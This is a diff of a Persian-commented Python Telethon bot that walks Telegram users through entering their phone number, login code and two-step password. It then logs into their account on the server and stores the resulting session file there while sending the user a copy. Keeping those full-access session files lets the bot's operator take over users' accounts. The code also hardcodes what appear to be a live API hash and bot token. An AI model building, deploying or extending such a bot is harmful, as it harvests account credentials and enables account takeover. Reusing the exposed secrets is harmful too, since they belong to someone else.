@@ -2,20 +2,16 @@ import os
 import sys
 import asyncio
 from telethon import TelegramClient, events
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
+from telethon.tl.functions.account import UpdateStatusRequest
 
 # ==================== تنظیمات اولیه ====================
-# تنظیم مستقیم مقادیر
 API_ID = 34855392
 API_HASH = "5e40d435847009c31c24042e2a3c0d3b"
 BOT_TOKEN = "8692323102:AAHVQ5sxZjQk81D8YN5QNItQXMt25vurXqQ"
 
-# بررسی وجود مقادیر
 if not API_ID or not API_HASH or not BOT_TOKEN:
     print("❌ ERROR: Missing required values!")
-    print(f"API_ID: {'✓' if API_ID else '✗'}")
-    print(f"API_HASH: {'✓' if API_HASH else '✗'}")
-    print(f"BOT_TOKEN: {'✓' if BOT_TOKEN else '✗'}")
     sys.exit(1)
 
 print(f"✅ API_ID: {API_ID}")
@@ -30,34 +26,24 @@ try:
     from aiohttp import web
     
     async def health_check(request):
-        """Endpoint ساده برای بررسی سلامت ربات"""
         return web.Response(text="✅ Bot is running!", status=200)
     
     async def run_web_server():
-        """اجرای web server روی پورت مشخص شده"""
         port = int(os.environ.get("PORT", 8080))
-        
         app = web.Application()
         app.router.add_get('/', health_check)
         app.router.add_get('/health', health_check)
-        
         runner = web.AppRunner(app)
         await runner.setup()
-        
         site = web.TCPSite(runner, '0.0.0.0', port)
         await site.start()
-        
         print(f"🌐 Web server running on port {port}")
-        
-        # نگه داشتن سرور تا زمانی که ربات فعال است
         while True:
             await asyncio.sleep(3600)
     
 except ImportError:
     print("⚠️ aiohttp not installed. Web server disabled.")
-    
     async def run_web_server():
-        """اگر aiohttp نصب نیست، یک تابع دامی اجرا کن"""
         port = int(os.environ.get("PORT", 8080))
         print(f"⚠️ Web server not available, but port {port} is configured.")
         while True:
@@ -79,18 +65,14 @@ class SessionBot:
         self.temp_clients = {}
 
     async def start(self):
-        # شروع ربات با توکن
         await self.bot.start(bot_token=BOT_TOKEN)
         print("🤖 ربات راه‌اندازی شد!")
-        
-        # نمایش اطلاعات ربات
         me = await self.bot.get_me()
         print(f"✅ ربات با نام @{me.username} آماده است!")
 
         @self.bot.on(events.NewMessage(pattern='/start'))
         async def start_command(event):
             user_id = event.sender_id
-            
             session_name = f"user_{user_id}"
             session_path = os.path.expanduser(f"~/sessions/{session_name}")
             
@@ -113,7 +95,8 @@ class SessionBot:
                 'code': '',
                 'phone': None,
                 'code_length': 5,
-                'message_id': None
+                'message_id': None,
+                'auth_code': None  # ذخیره کد احراز هویت
             }
             
             await event.respond(
@@ -139,14 +122,19 @@ class SessionBot:
                     if step == 'phone':
                         phone = event.text.strip()
                         
+                        # اتصال به کلاینت
                         await client.connect()
                         
+                        # بررسی اینکه آیا قبلاً احراز هویت شده
                         if not await client.is_user_authorized():
                             try:
-                                await client.send_code_request(phone)
+                                # ارسال درخواست کد
+                                send_result = await client.send_code_request(phone)
                                 user_data['phone'] = phone
                                 user_data['step'] = 'code'
                                 user_data['code'] = ''
+                                # ذخیره اطلاعات کد برای تأیید بعدی
+                                user_data['phone_code_hash'] = send_result.phone_code_hash
                                 
                                 await self.show_code_panel(event, user_data)
                                 
@@ -172,7 +160,6 @@ class SessionBot:
             if user_data['step'] == 'code' or user_data['step'] == '2fa':
                 await self.handle_code_input(event, user_data, data)
 
-        # اجرای ربات تا زمان قطع شدن
         await self.bot.run_until_disconnected()
 
     async def show_code_panel(self, event, user_data):
@@ -181,24 +168,21 @@ class SessionBot:
         code = user_data['code']
         
         if step == '2fa':
-            code_length = 0
             title = "🔐 رمز عبور دو مرحله‌ای را وارد کنید:"
             placeholder = "••••••••"
+            display_code = "•" * len(code) if code else placeholder
         else:
             code_length = user_data.get('code_length', 5)
             title = "📝 کد تأیید را وارد کنید:"
             placeholder = "_" * code_length
-        
-        if step == '2fa':
-            display_code = "•" * len(code) if code else placeholder
-        else:
-            display_code = code if code else placeholder
-            if len(code) < code_length:
+            
+            if code:
                 display_code = code + "_" * (code_length - len(code))
+            else:
+                display_code = placeholder
         
+        # ساخت دکمه‌ها
         buttons = []
-        
-        # دکمه‌های 1-9
         row = []
         for i in range(1, 10):
             row.append((str(i), f"code_{i}"))
@@ -206,7 +190,6 @@ class SessionBot:
                 buttons.append(row)
                 row = []
         
-        # ردیف آخر
         buttons.append([
             ("🗑️ پاک کردن", "code_clear"),
             ("0", "code_0"),
@@ -220,10 +203,7 @@ class SessionBot:
                 'callback_data': callback_data
             } for text, callback_data in row])
         
-        if step == '2fa':
-            message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن رمز استفاده کنید:"
-        else:
-            message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن کد استفاده کنید:"
+        message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن استفاده کنید:"
         
         if user_data.get('message_id'):
             try:
@@ -235,18 +215,10 @@ class SessionBot:
                     buttons=keyboard
                 )
             except:
-                msg = await event.respond(
-                    message_text,
-                    parse_mode='markdown',
-                    buttons=keyboard
-                )
+                msg = await event.respond(message_text, parse_mode='markdown', buttons=keyboard)
                 user_data['message_id'] = msg.id
         else:
-            msg = await event.respond(
-                message_text,
-                parse_mode='markdown',
-                buttons=keyboard
-            )
+            msg = await event.respond(message_text, parse_mode='markdown', buttons=keyboard)
             user_data['message_id'] = msg.id
         
         await event.answer()
@@ -255,7 +227,6 @@ class SessionBot:
         """پردازش ورودی‌های پنل کد"""
         code = user_data['code']
         step = user_data['step']
-        code_length = user_data.get('code_length', 5)
         
         if data.startswith('code_'):
             action = data.split('_')[1]
@@ -273,6 +244,7 @@ class SessionBot:
                         return
                     await self.verify_2fa(event, user_data)
                 else:
+                    code_length = user_data.get('code_length', 5)
                     if len(code) != code_length:
                         await event.answer(f"❗ لطفاً کد {code_length} رقمی را کامل وارد کنید.", alert=True)
                         return
@@ -282,6 +254,7 @@ class SessionBot:
                 if step == '2fa':
                     user_data['code'] = code + action
                 else:
+                    code_length = user_data.get('code_length', 5)
                     if len(code) < code_length:
                         user_data['code'] = code + action
                     else:
@@ -291,31 +264,44 @@ class SessionBot:
                 await event.answer()
 
     async def verify_code(self, event, user_data):
-        """تأیید کد ورود"""
+        """تأیید کد ورود با استفاده از روش صحیح Telethon"""
         code = user_data['code']
         phone = user_data['phone']
         client = user_data['client']
+        phone_code_hash = user_data.get('phone_code_hash')
         
         try:
-            await client.sign_in(phone, code)
+            # روش صحیح تأیید کد در Telethon
+            # استفاده از sign_in با پارامترهای صحیح
+            if phone_code_hash:
+                # اگر phone_code_hash موجود است، از آن استفاده کن
+                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+            else:
+                # روش دیگر: استفاده از send_code_request و سپس sign_in
+                await client.sign_in(phone, code)
             
+            # موفقیت
             await event.answer("✅ تأیید کد با موفقیت انجام شد!", alert=True)
             
+            # ارسال فایل سشن
             session_file = user_data['session_path'] + ".session"
             
             if os.path.isfile(session_file):
+                # ارسال به Saved Messages
                 await client.send_file(
                     "me",
                     session_file,
                     caption=f"📁 فایل سشن: {user_data['session_name']}"
                 )
                 
+                # ارسال به ربات
                 await self.bot.send_file(
                     event.chat_id,
                     session_file,
                     caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                 )
                 
+                # حذف پنل
                 if user_data.get('message_id'):
                     try:
                         await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
@@ -324,53 +310,72 @@ class SessionBot:
                 
                 await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                 
+                # پاک کردن داده‌های موقت
                 del self.temp_clients[event.sender_id]
             else:
                 await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                 
         except SessionPasswordNeededError:
+            # نیاز به رمز 2FA
             user_data['step'] = '2fa'
             user_data['code'] = ''
             await event.answer("🔐 نیاز به رمز عبور دو مرحله‌ای!", alert=True)
             await self.show_code_panel(event, user_data)
             
+        except PhoneCodeInvalidError:
+            # کد اشتباه
+            user_data['code'] = ''
+            await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
+            await self.show_code_panel(event, user_data)
+            
+        except PhoneCodeExpiredError:
+            # کد منقضی شده
+            await event.answer("❌ کد منقضی شده است. دوباره /start را بزنید.", alert=True)
+            del self.temp_clients[event.sender_id]
+            
         except Exception as e:
             error_msg = str(e)
-            if "PHONE_CODE_INVALID" in error_msg:
+            # بررسی خطاهای خاص
+            if "FLOOD" in error_msg:
+                await event.answer("❌ تعداد درخواست‌ها زیاد است. چند دقیقه صبر کنید.", alert=True)
+            elif "PHONE_CODE_INVALID" in error_msg:
                 user_data['code'] = ''
                 await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
                 await self.show_code_panel(event, user_data)
-            elif "CODE_EXPIRED" in error_msg:
-                await event.answer("❌ کد منقضی شده است. دوباره /start را بزنید.", alert=True)
-                del self.temp_clients[event.sender_id]
             else:
                 await event.answer(f"❌ خطا: {error_msg}", alert=True)
 
     async def verify_2fa(self, event, user_data):
-        """تأیید رمز 2FA"""
+        """تأیید رمز 2FA با استفاده از روش صحیح Telethon"""
         password = user_data['code']
         client = user_data['client']
         
         try:
+            # روش صحیح تأیید رمز 2FA در Telethon
             await client.sign_in(password=password)
             
+            # موفقیت
             await event.answer("✅ تأیید رمز با موفقیت انجام شد!", alert=True)
             
+            # ارسال فایل سشن
             session_file = user_data['session_path'] + ".session"
             
             if os.path.isfile(session_file):
+                # ارسال به Saved Messages
                 await client.send_file(
                     "me",
                     session_file,
                     caption=f"📁 فایل سشن: {user_data['session_name']}"
                 )
                 
+                # ارسال به ربات
                 await self.bot.send_file(
                     event.chat_id,
                     session_file,
                     caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                 )
                 
+                # حذف پنل
                 if user_data.get('message_id'):
                     try:
                         await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
@@ -379,6 +384,7 @@ class SessionBot:
                 
                 await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                 
+                # پاک کردن داده‌های موقت
                 del self.temp_clients[event.sender_id]
             else:
                 await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
@@ -394,27 +400,18 @@ class SessionBot:
 
 # ==================== اجرای اصلی ====================
 async def main():
-    # ایجاد پوشه سشن‌ها
     os.makedirs(os.path.expanduser("~/sessions"), exist_ok=True)
-    
-    # ایجاد نمونه ربات
     bot = SessionBot()
     
-    # اجرای همزمان ربات و سرور وب
     try:
-        # شروع ربات
         bot_task = asyncio.create_task(bot.start())
-        
-        # شروع سرور وب
         web_task = asyncio.create_task(run_web_server())
         
-        # منتظر ماندن تا اولین تسک تمام شود
         done, pending = await asyncio.wait(
             [bot_task, web_task],
             return_when=asyncio.FIRST_COMPLETED
         )
         
-        # اگر یکی از تسک‌ها تمام شد، بقیه را لغو کن
         for task in pending:
             task.cancel()
             
